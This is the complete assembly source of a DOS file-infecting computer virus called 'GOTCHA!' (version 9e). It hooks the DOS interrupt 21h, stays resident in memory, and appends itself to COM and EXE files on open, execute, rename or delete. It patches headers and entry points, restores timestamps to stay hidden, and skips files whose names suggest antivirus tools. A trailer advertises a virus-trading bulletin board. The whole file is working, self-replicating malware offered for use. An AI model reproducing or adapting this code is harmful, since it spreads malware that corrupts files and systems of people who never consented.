;****************************************************************************
;*              GOTCHA!  Version 9e
;****************************************************************************

cseg            segment
                assume  cs:cseg,ds:cseg,es:nothing

                org     100h

SIGNLEN         equ     signend - signature
FILELEN         equ     end - begin
RESPAR          equ     (FILELEN/16) + 17
VERSION         equ     9
BUFLEN          equ     20h
COMSIGN         equ     0
EXESIGN         equ     1
MINTARGET       equ     1000
MAXTARGET       equ     -FILELEN

                .RADIX  16


;****************************************************************************
;*              Start the program!
;****************************************************************************

begin:          xor     bx,bx
                call    install
                int     20


;****************************************************************************
;*              Data
;****************************************************************************

buffer          db      BUFLEN dup (?)
oi21            dw      ?,?
oldlen          dw      ?,?
nameptr         dw      ?,?
handle          dw      ?
comexe          db      ?


;****************************************************************************
;*              File-extensions
;****************************************************************************

EXE_txt         db      'EXE'
COM_txt         db      'COM'


;****************************************************************************
;*              Interupt handler 24
;****************************************************************************

ni24:           mov     al,03
                iret


;****************************************************************************
;*              Interupt handler 21
;****************************************************************************

ni21:           pushf

                cmp     ax,0DADAh               ;install-check ?
                je      do_DADA

                push    dx
                push    cx
                push    bx
                push    ax
                push    si
                push    di
                push    ds
                push    es

                cmp     ax,6C00h                ;open/create 4.00 ?
                je      do_6C00
                cmp     ah,56h                  ;rename ?
                je      doit
                cmp     ah,4Eh                  ;findfirst ?
                je      doit                    ;(only works without wildcards)
                cmp     ah,4Bh                  ;load / execute ?
                je      doit
                cmp     ah,43h                  ;attributes
                je      doit
                cmp     ah,41h                  ;delete ?
                je      doit                    ;(it might be un-deleted!)
                cmp     ah,3Dh                  ;open ?
                je      do_3D

                cmp     ah,17h                  ;FCB-rename?
                je      doFCB
                cmp     ah,13h                  ;FCB-delete?
                jne     exit

doFCB:          call    FCBtoASC                ;COMMAND.COM still uses FCB's!

doit:           call    infect

exit:           pop     es
                pop     ds
                pop     di
                pop     si
                pop     ax
                pop     bx
                pop     cx
                pop     dx
                popf

                jmp     dword ptr cs:[oi21]     ;call to old int-handler


do_3D:          test    al,03h                  ;only if opened for READING
                jne     exit
                jmp     short doit

do_6C00:        test    bl,03h                  ;idem
                jne     exit
                mov     dx,di                   ;ptr was DS:DI 
                jmp     short doit

do_DADA:        mov     ax,0A500h+VERSION       ;return a signature
                popf
                iret


;****************************************************************************
;*              Old Interupt handler 21
;****************************************************************************

org21:          pushf
                call    dword ptr cs:[oi21]     ;call to old int-handler
                ret


;****************************************************************************
;*              Tries to infect the file (ptr to ASCIIZ-name is DS:DX)
;****************************************************************************

infect:         cld

                mov     cs:[nameptr],dx         ;save the ptr to the filename
                mov     cs:[nameptr+2],ds

                mov     ah,62h                  ;get segment-adres of PSP
                int     21
                mov     ds,bx                   ;get seg-adres of environment
                mov     ax,ds:002Ch
                mov     ds,ax
                mov     si,0

envloop:        cmp     ds:[si],byte ptr 0      ;end of environment?
                je      verder7

                push    cs
                pop     es
                mov     di,offset envstring
                mov     bx,0

scloop:         mov     al,ds:[si]              ;check the current env-item
                cmpsb
                je      scv1
                inc     bx                      ;characters don't match!
scv1:           cmp     al,0                    ;end of env-item?
                jne     scloop

                cmp     bx,0                    ;did all characters match?
                je      return
                jmp     short envloop

verder7:        push    cs                      ;check the filename
                pop     ds
                les     di,dword ptr [nameptr]
                mov     dx,di                
                mov     cx,80                   ;search end of filename (-EXT)
                mov     al,'.'
        repnz   scasb
                mov     bx,di

                std                             ;find begin of filename
                mov     cl,11
                mov     al,'\'
        repnz   scasb
                cld
                je      vvv
                mov     di,dx
                jmp     short vvv2
vvv:            add     di,2
vvv2:           mov     al,'V'                  ;is it V*.* ?
                scasb
                je      return

                mov     cl,7                    ;is it *AN*.* ?
                mov     ax,'NA'
ANloop:         dec     di
                scasw
                loopnz  ANloop
                je      return

                mov     si,offset EXE_txt       ;is extension 'EXE'?
                mov     di,bx
                mov     cx,3
        rep     cmpsb
                jnz     verder4

                mov     byte ptr [comexe],EXESIGN
                jmp     short verder3

return:         ret

verder4:        mov     si,offset COM_txt       ;is extension 'COM'?
                mov     di,bx
                mov     cx,3
        rep     cmpsb
                jnz     return 

                mov     byte ptr [comexe],COMSIGN

verder3:        mov     ax,3300h                ;get ctrl-break flag
                int     21
                push    dx

                xor     dl,dl                   ;clear the flag
                mov     ax,3301h
                int     21

                mov     ax,3524h                ;get int24 vector
                int     21
                push    bx
                push    es

                push    cs                      ;set int24 vec to new handler
                pop     ds
                mov     dx,offset ni24
                mov     ax,2524h
                int     21

                lds     dx,dword ptr [nameptr]  ;get file-attribute
                mov     ax,4300h
                call    org21
                push    cx

                and     cx,0F8h                 ;clear READ-ONLY-flag
                call    setattr
                jc      return1_v

                push    cs                      ;open the file
                pop     ds
                lds     dx,dword ptr [nameptr]
                mov     ax,3D02h
                int     21
                jnc     verder2
return1_v:      jmp     return1                 ;something went wrong... :-(

verder2:        push    cs                      ;save handle
                pop     ds
                mov     [handle],ax

                mov     bx,[handle]             ;get file date & time
                mov     ax,5700h
                int     21
                push    cx
                push    dx

                call    endptr                  ;get file-length
                mov     [oldlen],ax
                mov     [oldlen+2],dx

                sub     ax,SIGNLEN              ;move ptr to end - SIGNLEN
                sbb     dx,0
                mov     cx,dx
                mov     dx,ax
                mov     al,00h
                call    ptrmov

                mov     cx,SIGNLEN              ;read the last bytes
                mov     dx,offset buffer   
                call    flread
                jc      return2_v

                push    cs                      ;compare bytes with signature
                pop     es
                mov     di,offset buffer
                mov     si,offset signature
                mov     cx,SIGNLEN
        rep     cmpsb
                jz      return2_v

                call    beginptr                ;read begin of file
                mov     cx,BUFLEN
                mov     dx,offset buffer
                call    flread

                cmp     byte ptr [comexe],EXESIGN
                jz      do_exe
                
do_com:         cmp     word ptr [oldlen],MAXTARGET   ;check length of file
                jnb     return2
                cmp     word ptr [oldlen],MINTARGET
                jbe     return2

                call    writeprog               ;write program to end of file
                jc      return2

                mov     ax,[oldlen]             ;calculate new start-adres
                add     ax,(offset entry - 0103h)
                mov     byte ptr [buffer],0E9h  ;'JMP'
                mov     word ptr [buffer+1],ax

                jmp     short verder1

return2_v:      jmp     short return2


do_exe:         call    writeprog               ;write program to end of file
                jc      return2

                mov     ax,[oldlen]             ;calculate new length 
                mov     dx,[oldlen+2]
                add     ax,FILELEN
                adc     dx,0

                mov     cl,9                    ;put new length in header
                shr     ax,cl
                mov     cl,7
                shl     dx,cl
                or      ax,dx
                inc     ax
                mov     word ptr [buffer+4],ax
                mov     ax,[oldlen]
                add     ax,FILELEN
                and     ax,01FFh
                mov     word ptr [buffer+2],ax

                mov     ax,[oldlen]             ;calculate new CS & IP
                mov     dx,[oldlen+2]
                mov     bx,word ptr [buffer+8]
                push    ax
                mov     cl,4
                shr     ax,cl
                mov     cl,0Ch
                shl     dx,cl
                add     ax,dx
                sub     ax,bx
                mov     word ptr [buffer+16h],ax  ;put CS in header
                pop     ax
                and     ax,000Fh
                add     ax,(offset entry - 0100h)
                mov     word ptr [buffer+14h],ax  ;put IP in header

verder1:        call    beginptr                ;write new begin of file
                mov     cx,BUFLEN
                mov     dx,offset buffer
                call    flwrite

return2:        mov     bx,[handle]             ;restore file date & time
                pop     dx
                pop     cx
                mov     ax,5701h
                int     21

                mov     bx,[handle]             ;close the file
                mov     ah,3Eh
                int     21

return1:        pop     cx                      ;restore file-attribute
                call    setattr

                pop     ds                      ;restore int24 vector
                pop     dx
                mov     ax,2524h
                int     21

                pop     dx                      ;restore ctrl-break flag
                mov     ax,3301h
                int     21

                ret


;****************************************************************************
;*              Gets ASCIIZ-filename from FCB
;****************************************************************************

FCBtoASC:       mov     si,dx
                lodsb
                inc     al                      ;extended FCB?
                jne     normal_FCB
                add     si,7
normal_FCB:     push    cs
                pop     es
                xor     di,di                   ;adres for ASCIIZ-name
                mov     dx,di
                mov     cx,8
FCB_loop:       lodsb                           ;copy all except spaces
                cmp     al,' '
                je      FCB_verder
                stosb
FCB_verder:     loop    FCB_loop
                mov     al,'.'                  ;append a '.'
                stosb
                mov     cl,3                    ;and the extension
        rep     movsb
                xchg    ax,cx                   ;and a final zero.
                stosb
                push    es
                pop     ds
                ret


;****************************************************************************
;*              Changes file-attributes
;****************************************************************************

setattr:        lds     dx,dword ptr cs:[nameptr]
                mov     ax,4301h
                call    org21
                ret


;****************************************************************************
;*              Writes program to end of file
;****************************************************************************

writeprog:      call    endptr
                mov     cx,FILELEN
                mov     dx,offset begin
;                call    flwrite                ;Hmm, save a few bytes!
;                ret


;****************************************************************************
;*              Subroutines for reading/writing
;****************************************************************************

flwrite:        mov     ah,40h
                jmp     short flvrdr

flread:         mov     ah,3Fh
flvrdr:         push    cs
                pop     ds
                mov     bx,cs:[handle]
                int     21
                ret


;****************************************************************************
;*              Subroutines for file-pointer
;****************************************************************************

beginptr:       mov     al,00h                  ;go to begin of file
                jmp     short ptrvrdr

endptr:         mov     al,02h                  ;go to end of file
ptrvrdr:        xor     cx,cx
                xor     dx,dx

ptrmov:         mov     bx,cs:[handle]          ;go somewhere
                mov     ah,42h
                int     21
                ret


;****************************************************************************
;*              This is where infected files start
;****************************************************************************

entry:          call    entry2
entry2:         pop     bx
                sub     bx,offset entry2        ;CS:BX is begin program - 100h

                pushf
                cld

                cmp     byte ptr cs:[bx+offset comexe],COMSIGN
                jz      entryC

entryE:         mov     ax,ds                   ;put old start-adres on stack
                add     ax,10
                add     ax,cs:[bx+offset buffer+016h]
                push    ax
                push    cs:[bx+offset buffer+014h]

                jmp     short entcheck
                
entryC:         mov     ax,bx                   ;restore old file-begin
                add     ax,offset buffer
                mov     si,ax
                mov     di,0100
                mov     cx,BUFLEN
        rep     movsb

                push    cs                      ;put old start-adres on stack
                mov     ax,0100h
                push    ax

entcheck:       mov     ax,0DADAh               ;already installed?
                int     21h
                cmp     ah,0A5h
                je      entstop

                call    install                 ;install the program

entstop:        iret


;****************************************************************************
;*              Install the program at top of memory
;****************************************************************************

install:        push    ds
                push    es

                xor     ax,ax                   ;get original int21 vector
                mov     es,ax
                mov     cx,word ptr es:0084h
                mov     dx,word ptr es:0086h
                mov     cs:[bx+offset oi21],cx
                mov     cs:[bx+offset oi21+2],dx

                mov     ax,ds                   ;adjust memory-size
                dec     ax
                mov     es,ax
                cmp     byte ptr es:[0000h],5Ah
                jnz     cancel
                mov     ax,es:[0003h]
                sub     ax,RESPAR
                jb      cancel
                mov     es:[0003h],ax
                sub     es:[0012h], word ptr RESPAR

                push    cs                      ;copy program to top
                pop     ds
                mov     es,es:[0012h]
                mov     ax,bx
                add     ax,0100
                mov     si,ax
                mov     di,0100h
                mov     cx,FILELEN
        rep     movsb

                mov     dx,offset ni21          ;set vector to new handler
                push    es
                pop     ds
                mov     ax,2521h
                int     21h

cancel:         pop     es
                pop     ds

                ret


;****************************************************************************
;*              Text and Signature
;****************************************************************************

envstring:      db      'E=mcý',0               ;put this in your environment!

signature:      db      'GOTCHA!',0             ;I have got you!  :-)
signend:



end:

cseg            ends
                end     begin

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> and Remember Don't Forget to Call <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄ> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <ÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

